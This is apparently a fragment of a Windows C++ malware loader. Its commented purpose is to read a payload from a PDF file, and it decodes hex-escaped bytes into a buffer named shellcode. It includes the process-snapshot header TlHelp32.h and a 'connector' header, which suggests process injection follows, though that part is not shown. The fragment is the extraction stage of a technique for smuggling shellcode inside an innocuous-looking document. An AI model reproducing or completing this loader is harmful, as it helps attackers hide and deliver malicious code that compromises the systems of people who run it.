#include <windows.h>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <vector>
#include <TlHelp32.h>
#include "connector.h"

//----------------------------------------------------------------------------------------------------------------
//function to read the payload from the pdf file:

int char2int(char input)
{
	if (input >= '0' && input <= '9')
		return input - '0';
	if (input >= 'A' && input <= 'F')
		return input - 'A' + 10;
	if (input >= 'a' && input <= 'f')
		return input - 'a' + 10;
	throw std::invalid_argument("Invalid input string");
}

unsigned char* ReadPDFFILE(const char* fnamSc, DWORD* szSc) {
	std::vector <unsigned char> shellcode = {};

	std::ifstream fin(fnamSc);
	if (!fin)
	{
		*szSc = 0;
		return nullptr;
	}

	while (1)
	{
		int ch = fin.get();

	
		if (ch == EOF)
			break;


		if (ch == '\n' || ch == '\r')
			continue;

		if (ch == '\\')
		{
			int x = fin.get();
			int v10 = char2int(fin.get());	
			int v1 = char2int(fin.get());	
			shellcode.push_back(16 * v10 + v1);
		}
	}

	
	fin.close();
	unsigned char* scarray = { new unsigned char[shellcode.size()] };
	int i = 0;
	for (unsigned char c : shellcode)
		scarray[i++] = c;

	*szSc = shellcode.size();
	return scarray;

}
